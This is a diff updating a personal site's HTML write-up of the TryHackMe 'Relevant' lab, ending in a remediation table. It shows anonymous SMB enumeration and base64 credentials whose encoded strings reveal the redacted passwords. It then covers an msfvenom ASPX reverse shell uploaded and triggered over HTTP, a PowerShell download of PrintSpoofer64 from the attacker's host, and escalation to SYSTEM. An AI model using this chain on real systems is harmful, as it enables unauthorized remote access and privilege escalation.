@@ -1,94 +1,318 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Relevant — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Relevant — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty medium-badge">Medium</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Relevant</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Windows Server 2019 · Anonymous SMB → Credential Recovery → SMB Shell Upload → Token Impersonation</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Windows Server 2019</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.10.x.x</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-medium">Medium</span>
+        <span class="badge badge-os">Windows</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="relevant-tryhackme-writeup">Relevant - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Relevant</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Windows Server 2016 Standard Evaluation (Build 14393)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target IP</strong></td>
+<td style="text-align: left;"><code>10.49.165.122</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code> (<code>tun1</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Medium</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">Anonymous Writable SMB Share (<code>nt4wrksv</code>), Encoded Passwords in <code>passwords.txt</code>, High-Port IIS Web Service (Port 49663), Direct SMB-to-Web Directory Mapping, ASPX Reverse Shell Upload, Privilege Escalation via <strong>PrintSpoofer64</strong> (<code>SeImpersonatePrivilege</code>)</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191402.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<pre><code>Recon (Nmap Full Port Scan)
+  ↓  Ports: 80, 135, 139, 445, 3389, 49663 (IIS 10.0), 49666, 49667
+SMB Null Session Enumeration:
+  ↓  smbclient -L //10.49.165.122/ -N  → Share: nt4wrksv
+  ↓  smbclient //10.49.165.122/nt4wrksv -N → get passwords.txt
+passwords.txt Base64 Decoding:
+  ↓  pass1.txt: Bob - ********
+  ↓  pass2.txt: Bill - ********
+Gobuster on Port 49663:
+  ↓  Found: /nt4wrksv/ (HTTP 301)
+  ↓  Browsed http://10.49.165.122:49663/nt4wrksv/passwords.txt (Confirmed mapping)
+Initial Foothold (ASPX Reverse Shell via SMB):
+  ↓  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun1 LPORT=4444 -f aspx -o shell.aspx
+  ↓  smbclient put shell.aspx → Triggered via HTTP GET
+  ↓  Penelope listener (4444) receives shell as iis apppool\defaultapppool
+Privilege Escalation (PrintSpoofer):
+  ↓  whoami /priv → SeImpersonatePrivilege Enabled
+  ↓  Invoke-WebRequest http://192.168.132.94:8000/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe
+  ↓  C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd.exe → nt authority\system
+Flags Extraction:
+  ↓  type C:\Users\Bob\Desktop\user.txt &amp; type C:\Users\Administrator\Desktop\root.txt
+  ↓  User Flag: THM{********************************}
+  ↓  Root Flag: THM{********************************}
+</code></pre>
+<hr />
+<h2 id="2-phase-1-reconnaissance-enumeration">2. Phase 1: Reconnaissance &amp; Enumeration</h2>
+<h3 id="21-full-port-scanning-nmap">2.1 Full Port Scanning (Nmap)</h3>
+<p>We run a full TCP port scan against target <code>10.49.165.122</code>:</p>
+<pre><code class="language-bash">nmap -sV -sC -p- 10.49.165.122 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112160022.png" /></p>
+<p><strong>Identified Ports:</strong><br />
+- <strong>Port 80/tcp</strong>: Microsoft IIS httpd 10.0<br />
+- <strong>Port 135/tcp</strong>: Microsoft Windows RPC<br />
+- <strong>Port 139/tcp / 445/tcp</strong>: Microsoft Windows SMB<br />
+- <strong>Port 3389/tcp</strong>: Microsoft Terminal Services (RDP)<br />
+- <strong>Port 49663/tcp</strong>: Microsoft IIS httpd 10.0<br />
+- <strong>Port 49666/tcp / 49667/tcp</strong>: Microsoft Windows RPC</p>
+<h3 id="22-smb-enumeration-passwordstxt">2.2 SMB Enumeration &amp; <code>passwords.txt</code></h3>
+<p>We check available SMB shares using a null session:</p>
+<pre><code class="language-bash">smbclient -L //10.49.165.122/ -N
+</code></pre>
+<p>We connect to the readable/writable share <strong><code>nt4wrksv</code></strong> and list its contents:</p>
+<pre><code class="language-bash">smbclient //10.49.165.122/nt4wrksv -N
+smb: \&gt; ls
+smb: \&gt; get passwords.txt
+smb: \&gt; exit
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112153717.png" /></p>
+<p>We inspect <code>passwords.txt</code> with <code>nano</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112153831.png" /></p>
+<pre><code class="language-text">[User Passwords - Encoded]
+Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+</code></pre>
+<h3 id="23-decoding-base64-credentials">2.3 Decoding Base64 Credentials</h3>
+<p>We decode both base64 strings into separate files:</p>
+<pre><code class="language-bash">echo &quot;Qm9iIC0gIVBAJCRXMHJEITEyMw==&quot; | base64 -d &gt; pass1.txt
+echo &quot;QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk&quot; | base64 -d &gt; pass2.txt
+cat pass1.txt
+cat pass2.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112154005.png" /></p>
+<p><strong>Decoded Credentials:</strong><br />
+- <code>Bob</code> - <code>[REDACTED]</code><br />
+- <code>Bill</code> - <code>[REDACTED]</code></p>
+<hr />
+<h2 id="3-phase-2-web-enumeration-initial-access">3. Phase 2: Web Enumeration &amp; Initial Access</h2>
+<h3 id="31-web-directory-busting-on-port-49663-gobuster">3.1 Web Directory Busting on Port 49663 (Gobuster)</h3>
+<p>Since port 80 did not expose the SMB share, we perform directory brute-forcing against the high IIS port <code>49663</code>:</p>
+<pre><code class="language-bash">gobuster dir -u http://10.49.165.122:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112160409.png" /></p>
+<p><strong>Result:</strong></p>
+<pre><code class="language-text">nt4wrksv (Status: 301) [Size: 159] [--&gt; http://10.49.165.122:49663/nt4wrksv/]
+</code></pre>
+<h3 id="32-confirming-smb-to-web-directory-mapping">3.2 Confirming SMB-to-Web Directory Mapping</h3>
+<p>We browse to <code>http://10.49.165.122:49663/nt4wrksv/</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112160439.png" /></p>
+<p>We then verify that the <code>passwords.txt</code> file located in the SMB share is directly served via HTTP at <code>http://10.49.165.122:49663/nt4wrksv/passwords.txt</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112160520.png" /></p>
+<p>This confirms that any file uploaded to the <code>nt4wrksv</code> SMB share can be executed via the IIS web server on port 49663.</p>
+<h3 id="33-generating-uploading-aspx-reverse-shell">3.3 Generating &amp; Uploading ASPX Reverse Shell</h3>
+<p>We generate a 64-bit Windows ASPX reverse shell using <code>msfvenom</code> targeting our VPN IP (<code>tun1</code>):</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun1 LPORT=4444 -f aspx -o shell.aspx
+</code></pre>
+<p>We upload <code>shell.aspx</code> into the <code>nt4wrksv</code> SMB share:</p>
+<pre><code class="language-bash">smbclient //10.49.165.122/nt4wrksv -N
+smb: \&gt; put shell.aspx
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112161258.png" /></p>
+<h3 id="34-catching-reverse-shell">3.4 Catching Reverse Shell</h3>
+<p>We prepare our listener with <strong>Penelope</strong>:</p>
+<pre><code class="language-bash">penelope nc -p 4444
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112161312.png" /></p>
+<p>We trigger the payload by requesting <code>http://10.49.165.122:49663/nt4wrksv/shell.aspx</code> in the browser:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112161327.png" /></p>
+<p>Penelope catches the reverse shell:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112161339.png" /></p>
+<pre><code class="language-text">[New Reverse Shell] =&gt; RELEVANT 10.49.165.122 Microsoft_Windows_Server_2016_Standard_Evaluation-x64-based_PC  iis apppool\defaultapppool
+c:\windows\system32\inetsrv&gt;whoami
+iis apppool\defaultapppool
+</code></pre>
+<p>We have achieved initial access as <strong><code>iis apppool\defaultapppool</code></strong>.</p>
+<hr />
+<h2 id="4-phase-3-privilege-escalation-via-printspoofer">4. Phase 3: Privilege Escalation via PrintSpoofer</h2>
+<h3 id="41-checking-token-privileges">4.1 Checking Token Privileges</h3>
+<p>We inspect the privileges assigned to our service token:</p>
+<pre><code class="language-cmd">c:\windows\system32\inetsrv&gt;whoami /priv
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112161404.png" /></p>
+<pre><code class="language-text">PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre>
+<p>The presence of <strong><code>SeImpersonatePrivilege: Enabled</code></strong> on Windows Server 2016 allows local privilege escalation via named pipe impersonation using <strong>PrintSpoofer</strong>.</p>
+<h3 id="42-hosting-printspoofer-binary">4.2 Hosting PrintSpoofer Binary</h3>
+<p>On the attacker machine inside the <code>privesc</code> directory containing <code>PrintSpoofer64.exe</code>, we start a Python HTTP server:</p>
+<pre><code class="language-bash">python3 -m http.server 8000
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112161519.png" /></p>
+<h3 id="43-executing-printspoofer64-to-system">4.3 Executing PrintSpoofer64 to SYSTEM</h3>
+<p>From PowerShell on the target machine, we download <code>PrintSpoofer64.exe</code> to <code>C:\Windows\Temp</code> and execute it to spawn an elevated <code>cmd.exe</code>:</p>
+<pre><code class="language-powershell">PS C:\Windows\System32\inetsrv&gt; Invoke-WebRequest http://192.168.132.94:8000/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe
+PS C:\Windows\System32\inetsrv&gt; C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd.exe
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112162050.png" /></p>
+<p><strong>Output:</strong></p>
+<pre><code class="language-text">[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Relevant</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Windows Server 2019</td></tr>
-      <tr><th>Difficulty</th><td>Medium</td></tr>
-      <tr><th>Key Techniques</th><td>Anonymous SMB, Base64 Credential Recovery, ASPX Web Shell, PrintSpoofer, SeImpersonatePrivilege</td></tr>
-    </table>
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre>
+<p>We have escalated to <strong><code>NT AUTHORITY\SYSTEM</code></strong>.</p>
+<h3 id="44-capturing-user-and-root-flags">4.4 Capturing User and Root Flags</h3>
+<p>From our SYSTEM shell on the Administrator Desktop, we read both flags in a single command:</p>
+<pre><code class="language-cmd">C:\Users\Administrator\Desktop&gt;type C:\Users\Bob\Desktop\user.txt &amp; type C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261112162321.png" /></p>
+<pre><code class="language-text">THM{********************************}
+</code></pre>
+<ul>
+<li>🚩 <strong>User Flag:</strong> <code>THM{********************************}</code></li>
+<li>🚩 <strong>Root Flag:</strong> <code>THM{********************************}</code></li>
+</ul>
+<hr />
+<h2 id="5-security-mitigations-remediation">5. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability / Misconfiguration</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Anonymous Writable SMB Share directly served as Web Root</strong></td>
+<td style="text-align: left;">Unauthenticated remote arbitrary file upload and RCE.</td>
+<td style="text-align: left;">1. Disable anonymous/guest SMB access.<br>2. Strictly separate file shares from web server document roots.<br>3. Remove execute permissions for application pools on upload folders.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Cleartext / Base64 Encoded Passwords in Public Share</strong></td>
+<td style="text-align: left;">Credential leakage (<code>Bob</code> &amp; <code>Bill</code>).</td>
+<td style="text-align: left;">Never store passwords in unauthenticated network shares; implement centralized identity management and password vaults.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Token Impersonation Abuse (<code>SeImpersonatePrivilege</code>)</strong></td>
+<td style="text-align: left;">Service account escalation to full <code>NT AUTHORITY\SYSTEM</code>.</td>
+<td style="text-align: left;">Follow the principle of least privilege: configure IIS application pools to run under accounts without <code>SeImpersonatePrivilege</code>, or upgrade to Windows builds resistant to pipe potato attacks.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="6-tools-used">6. Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tool</th>
+<th style="text-align: left;">Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Nmap</strong></td>
+<td style="text-align: left;">Full port scanning (<code>nmap -sV -sC -p- 10.49.165.122 -Pn</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>smbclient</strong></td>
+<td style="text-align: left;">Null session SMB share enumeration, file download (<code>passwords.txt</code>), and ASPX upload</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Gobuster</strong></td>
+<td style="text-align: left;">Web directory brute-forcing on port 49663 discovering <code>/nt4wrksv/</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>msfvenom</strong></td>
+<td style="text-align: left;">Generating Windows x64 ASPX reverse shell (<code>windows/x64/shell_reverse_tcp</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Penelope</strong></td>
+<td style="text-align: left;">Catching and interacting with the reverse shell</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Python HTTP Server</strong></td>
+<td style="text-align: left;">Hosting <code>PrintSpoofer64.exe</code> on port 8000</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>PrintSpoofer64.exe</strong></td>
+<td style="text-align: left;">Exploiting <code>SeImpersonatePrivilege</code> to achieve <code>NT AUTHORITY\SYSTEM</code></td>
+</tr>
+</tbody>
+</table>
+    </div>
+  </main>
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 80 (IIS) · Port 445 (SMB) · Port 3389 (RDP) · Port 49663 (IIS)
-  → smbclient -N → nt4wrksv share → passwords.txt
-  → cat passwords.txt → Base64-encoded credentials → Bill : [REDACTED]
-  → Port 49663 maps to nt4wrksv SMB share → upload aspx shell
-  → msfvenom windows/x64/shell_reverse_tcp → shell.aspx → trigger via browser
-  → Shell as iis apppool\defaultapppool
-  → whoami /priv → SeImpersonatePrivilege Enabled
-  → PrintSpoofer.exe -i -c cmd → nt authority\system
-  → user.txt (Bob Desktop) · root.txt (Administrator Desktop)</div>
-
-    <h2>// Methodology</h2>
-    <p>This writeup follows the standard penetration testing lifecycle:
-    <strong>Reconnaissance</strong> → <strong>Enumeration</strong> → <strong>Exploitation</strong> →
-    <strong>Post-Exploitation</strong> → <strong>Privilege Escalation</strong> → <strong>Remediation</strong>.</p>
-    <p style="color:#555;font-size:13px;margin-top:12px">
-      📸 Full screenshot evidence is available in the original report.
-      Sensitive flags and credentials are redacted in compliance with TryHackMe guidelines.
-    </p>
-
-    <h2>// Tools Used</h2>
-    <ul style="color:#888;font-size:13px;line-height:2.2;margin-left:20px">
-      <li><code>Nmap</code></li>
-      <li><code>smbclient</code></li>
-      <li><code>msfvenom</code></li>
-      <li><code>PrintSpoofer</code></li>
-    </ul>
-
-  </article>
-
+  <!-- FOOTER -->
   <footer class="footer">
-    <div class="footer-inner">
-      <div class="footer-links">
-        <a href="https://github.com/OfflineDevc" target="_blank">GitHub</a>
-        <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a>
-        <a href="https://profile.hackthebox.com/profile/01a11ceb-de8c-7382-a00c-8fab28836ef1" target="_blank">HackTheBox</a>
-        <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a>
-      </div>
-      <p class="footer-copy">© 2026 Kun Poonkasetvatana. Educational purposes only.</p>
-    </div>
+    <p>Built by <a href="https://github.com/OfflineDevc" target="_blank">OfflineDevc</a> · 
+       <a href="https://tryhackme.com/p/Distowel" target="_blank">TryHackMe</a> · 
+       <a href="https://www.linkedin.com/in/kun-poonkasetvatana-4b6317326/" target="_blank">LinkedIn</a></p>
   </footer>
-
 </body>
 </html>
